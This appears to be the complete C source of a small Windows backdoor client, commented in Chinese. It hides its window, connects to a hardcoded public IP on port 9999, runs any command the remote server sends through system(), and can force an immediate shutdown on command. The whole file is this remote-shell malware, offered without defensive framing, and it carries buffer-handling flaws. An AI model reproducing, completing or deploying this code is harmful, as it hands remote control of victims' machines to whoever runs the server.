#include <stdio.h>
#include <Winsock2.h>
#include <String.h>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) 
#pragma comment(lib,"ws2_32.lib")
void creatSock(){
	WSADATA wsaData;
    SOCKET sockClient;//客户端Socket
    SOCKADDR_IN addrServer;//服务端地址
    WSAStartup(MAKEWORD(2,2),&wsaData);
    //新建客户端socket
    sockClient=socket(AF_INET,SOCK_STREAM,0);
    //定义要连接的服务端地址
    addrServer.sin_addr.S_un.S_addr=inet_addr("39.108.227.217");//目标IP(127.0.0.1是回送地址)
    addrServer.sin_family=AF_INET;
    addrServer.sin_port=htons(9999);//连接端口6000

	bool is_cmd_mode = false;
    //数据
	char sen[20]="";
	char rec[20]="";
	while(1){
		//连接到服务端
		connect(sockClient,(SOCKADDR*)&addrServer,sizeof(SOCKADDR));
		memset(rec,0,sizeof(char)*20);
		if(recv(sockClient,rec,20,0)){
			if(is_cmd_mode){
				if(strcmp(rec,"exitcmd")==0){
					is_cmd_mode = false;
					strcpy(sen,"exit cmd mode");
				}else{
					system(rec);
					strcpy(sen,"cmd:");
					strcat(sen,rec);
				}
			}else{
				if(strcmp(rec,"EXIT")==0){
					strcpy(sen,"exit");
					break;
				}
				else if(strcmp(rec,"cmd")==0 && is_cmd_mode == false){
					is_cmd_mode = true;
					strcpy(sen,"CMD_MODE!");
					printf("entry cmd mode!");
				}
				else if(strcmp(rec,"shut")==0){
					printf("shutdown command recviced!");
					strcpy(sen,"exit");
					system("shutdown -s -t 0");
					break;
				}else{
					strcpy(sen,"Type \'help\' for help");
				}
			}
			send(sockClient,sen,strlen(sen)+1,0);
		}
	}
	send(sockClient,sen,strlen(sen)+1,0);
    //关闭socket
    closesocket(sockClient);
    WSACleanup();
}


int main(){
	creatSock();
	//system("pause");
	return 0;
}